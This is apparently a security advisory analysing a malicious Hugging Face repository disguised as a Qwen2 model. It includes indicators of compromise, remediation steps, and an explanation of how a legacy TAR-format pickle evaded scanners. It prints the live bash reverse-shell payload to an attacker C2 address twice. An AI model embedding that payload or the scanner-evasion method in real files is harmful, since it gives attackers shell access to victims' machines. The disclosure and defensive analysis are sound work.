# Reverse Shell Malware Disguised as Qwen2 Model on Hugging Face

**Date:** March 30, 2026
**Classification:** MALICIOUS — Reverse Shell
**Status:** Reported to Hugging Face Security and AWS Trust & Safety. Model removed.

---

## Summary

On March 30, 2026, we identified a malicious model in the Hugging Face repository `LQCTestingSpace/lqc_model`, disguised as a Qwen2 language model. The repository contained no real model weights — only a 10.2 KB pickle payload that opens a reverse shell to an attacker-controlled AWS EC2 instance in Singapore (`18.138.220.214:11014`).

The model had been on the platform for three days, was downloaded 108 times, and every scanner on Hugging Face either returned "No issue" or remained queued at the time of discovery. The payload used PyTorch's legacy TAR-based serialization format, a documented scanner bypass technique that, to our knowledge, had not been observed in the wild prior to this case.

We reported the model to Hugging Face Security and AWS Trust & Safety. Hugging Face removed the repository following our report.

## Indicators of Compromise

| Indicator | Value |
|---|---|
| Model URL | `https://huggingface.co/LQCTestingSpace/lqc_model` (removed) |
| Malicious file | `pytorch_model.bin` |
| File size | 10,240 bytes (10.2 KB) |
| File format | TAR archive containing pickle payload |
| C2 IP | `18.138.220.214` |
| C2 port | `11014/tcp` |
| C2 hosting | Amazon Data Services Singapore (AWS EC2, `ap-southeast-1`) |
| C2 netblock | `18.138.0.0/15` (AMAZON-SIN) |
| Uploader | NoSpaceAvailable |
| Organization | LQCTestingSpace |
| Downloads | 108 (at time of report) |
| Upload date | March 27, 2026 |
| Reported | March 30, 2026 |

## The Payload

The pickle payload embedded in `pytorch_model.bin` executes the following command during deserialization:

```python
__import__("os").system("bash -c 'bash -i >& /dev/tcp/18.138.220.214/11014 0>&1'")
```

This is a standard bash reverse shell:

1. Imports `os`
2. Calls `os.system()` to run a shell command
3. Launches an interactive bash session (`bash -i`)
4. Redirects stdin, stdout, and stderr to a TCP connection to the C2 server

If the C2 server is listening, the attacker gains a fully interactive shell on the victim's machine with the victim's user privileges.

## Why Scanners Missed It

### The evasion technique: Legacy TAR loading path

The file is **not** a standard ZIP-based PyTorch checkpoint. It begins with the bytes `storages` followed by a `ustar` TAR header at offset `0x100`, identifying it as a **TAR archive** — the legacy format used by older versions of `torch.save()`.

This matters because every existing static scanner (PickleScan, ModelScan, Hugging Face's built-in scanner, ProtectAI Guardian) expects the modern ZIP-based container format. When they encounter a TAR-based file, they either fail to parse it or skip it entirely. **PyTorch's `torch.load()` handles both formats transparently** — the framework loads the TAR, extracts the pickle stream, and executes the payload. The scanners never see it.

### Scanner results at time of discovery

All scanner results on Hugging Face showed either "No issue" or "Queued." The model was fully downloadable and executable with no security warning.

---

## The Disguise

The repository included a `config.json` claiming the following architecture:

```json
{
  "architectures": ["Qwen2ForCausalLM"],
  "hidden_size": 896,
  "num_hidden_layers": 24
}
```

A legitimate Qwen2 model with these parameters would require approximately **300 MB** of weights. The actual file was **10.2 KB** — roughly **30,000x smaller** than expected. The `config.json` exists solely to make the model loadable via `transformers.AutoModel.from_pretrained()`.

---

## Static Analysis

### String extraction

The following strings were extracted from the binary:

```
storages
builtins
R__import__("os").system("bash -c 'bash -i >& /dev/tcp/18.138.220.214/11014 0>&1'")
tensors
```

The `builtins` reference and the `R` (pickle REDUCE opcode) confirm this is a pickle-based code execution payload. The reverse shell command is visible in plaintext.

## Commit History

The repository contained 12 commits from a single author, all dated March 27–28, 2026:

| # | Date / Time | Message |
|---|---|---|
| 1 | Mar 27, 09:50 | initial commit |
| 2 | Mar 27, 09:50 | Upload folder using huggingface_hub |
| 3 | Mar 27, 11:02 | Upload folder using huggingface_hub |
| 4 | Mar 27, 11:11 | Upload folder using huggingface_hub |
| 5 | Mar 27, 11:13 | Upload folder using huggingface_hub |
| 6 | Mar 27, 11:21 | Upload folder using huggingface_hub |
| 7 | Mar 27, 11:24 | Upload folder using huggingface_hub |
| 8 | Mar 28, 14:50 | Upload folder using huggingface_hub |
| 9 | Mar 28, 14:52 | Upload folder using huggingface_hub |
| 10 | Mar 28, 14:56 | Upload folder using huggingface_hub |
| 11 | Mar 28, 15:00 | Upload folder using huggingface_hub |
| 12 | Mar 28, 15:01 | Upload folder using huggingface_hub |

Two development sessions: 6 commits on March 27 over ~1.5 hours, then 5 rapid commits on March 28 within 11 minutes. This pattern suggests the attacker was iterating on the payload.

## Attack Scenario

```
Step 1: Attacker creates LQCTestingSpace org on Hugging Face
        Uploads pytorch_model.bin containing pickle reverse shell

Step 2: config.json claims Qwen2ForCausalLM architecture
        Model appears legitimate and loads via transformers

Step 3: Victim loads the model:
        >>> from transformers import AutoModel
        >>> model = AutoModel.from_pretrained("LQCTestingSpace/lqc_model")

Step 4: torch.load() deserializes the pickle → triggers os.system()

Step 5: Bash reverse shell connects to 18.138.220.214:11014

Step 6: Attacker gets interactive shell with victim's privileges
```

## Key Takeaways

- **ML models are executable artifacts.** Loading a model from a public hub can execute arbitrary code on your machine. This is not theoretical — it happened here.
- **Static scanners missed it.** Every scanner on Hugging Face failed to flag a plaintext reverse shell because the payload was wrapped in a TAR archive that scanners cannot parse, even though PyTorch loads it without issue.
- **Published bypass techniques are being used in the wild.** The legacy TAR loading path was documented as a scanner evasion technique in academic research. This is the first confirmed case of it being deployed against a real platform.
- **File size is a signal.** A 10.2 KB file claiming to be a 24-layer language model is a 30,000x size mismatch. Simple metadata validation would have flagged this immediately.

## Recommended Actions

If you downloaded and loaded `LQCTestingSpace/lqc_model` before its removal:

- **Treat the system as compromised.** The reverse shell grants full interactive access with your user privileges.
- **Check for active connections** to `18.138.220.214` on port `11014`.
- **Review process history** for unexpected `bash` processes spawned by Python.
- **Rotate credentials** accessible from the affected machine.
- **Block the C2 IP** at your network egress.

We reported our findings to Hugging Face's security team, who removed the repository. We are publishing this advisory for users who may have downloaded the model before the takedown.
